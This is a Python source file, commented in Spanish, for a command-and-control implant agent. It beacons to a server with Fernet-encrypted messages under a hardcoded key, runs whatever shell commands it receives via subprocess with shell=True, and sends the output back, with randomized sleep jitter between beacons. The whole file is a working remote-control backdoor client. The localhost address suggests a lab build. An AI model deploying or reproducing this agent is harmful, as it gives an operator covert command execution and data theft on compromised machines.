import requests
import subprocess
import time
import random
import uuid
from cryptography.fernet import Fernet

SERVER_URL = "http://127.0.0.1:5000"
SECRET_KEY = b'nHuM0pBE-Y7viblvjCQ954dB1DLPz8taaYertGmoAgc='  # La del servidor

AGENT_ID = str(uuid.uuid4())
cipher = Fernet(SECRET_KEY)

print(f"[*] Agente iniciado - ID: {AGENT_ID}")

def encrypt_data(data):
    if isinstance(data, dict):
        import json
        data = json.dumps(data)
    return cipher.encrypt(data.encode()).decode()

def decrypt_data(data):
    import json
    decrypted = cipher.decrypt(data.encode())
    return json.loads(decrypted.decode())

while True:
    try:
        # Beacon
        print(f"\n[{time.strftime('%H:%M:%S')}] Haciendo beacon...")
        payload = encrypt_data({"id": AGENT_ID})
        response = requests.post(f"{SERVER_URL}/api/status", 
                                json={"data": payload}, 
                                timeout=5)
        
        if response.status_code == 200:
            data = decrypt_data(response.json()['data'])
            task = data.get('task')
            
            if task:
                print(f"Tarea recibida: {task}")
                
                # Ejecutar
                cmd = task.get('command')
                print(f"Ejecutando: {cmd}")
                
                result = subprocess.check_output(cmd, shell=True, 
                                                stderr=subprocess.STDOUT)
                output = result.decode()
                print(f"Output: {output[:100]}")
                
                # Enviar resultado
                result_payload = encrypt_data({"id": AGENT_ID, "output": output})
                requests.post(f"{SERVER_URL}/api/upload",
                            json={"data": result_payload},
                            timeout=5)
                print(f"Resultado enviado")
            else:
                print("Sin tareas")
        
    except Exception as e:
        print(f"Error: {e}")
    
    time.sleep(random.randint(5, 10))
